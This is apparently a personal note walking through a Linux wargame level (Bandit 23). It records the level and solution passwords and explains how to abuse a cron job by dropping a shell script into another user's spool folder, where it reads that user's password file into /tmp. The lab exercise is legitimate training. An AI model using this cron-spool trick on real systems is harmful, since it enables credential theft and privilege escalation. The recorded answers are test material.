
[Bandit](Bandit.md)     [[HACKING]]     [[LINUX]]

# Bandit - level 23

password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
solution: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 

## Level Goal  

A program is running automatically at regular intervals from cron, the
time-based job scheduler. Look in /etc/cron.d/ for the configuration and see
what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a
very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may
want to keep a copy around…

### Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Solution

1. `cat /etc/cron.d/cronjob_bandit24`
2. cat /usr/bin/cronjob_bandit24.sh`
3. in the script I see that all files in `/var/spool/bandit24` are being
   executed and deleted every minute. So the trick is to create a shell script
   which reads the password from bandit24 and writes it in a file. I then have
   to move my script to bandit24#s spool folder:
   ```
   rm -rf /tmp/bandit23
   mkdir /tmp/bandit23
   cd /tmp/bandit23
   
   touch get_password.sh
   chmod 777 get_password.sh
   
   touch password
   chmod 666 password
   ```
4. get_password.sh:
   ```
   #!/bin/bash
   cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password
   ```
1. `cp get_password.sh /var/spool/bandit24`
2. wait for one minute and the password will be written to the file.



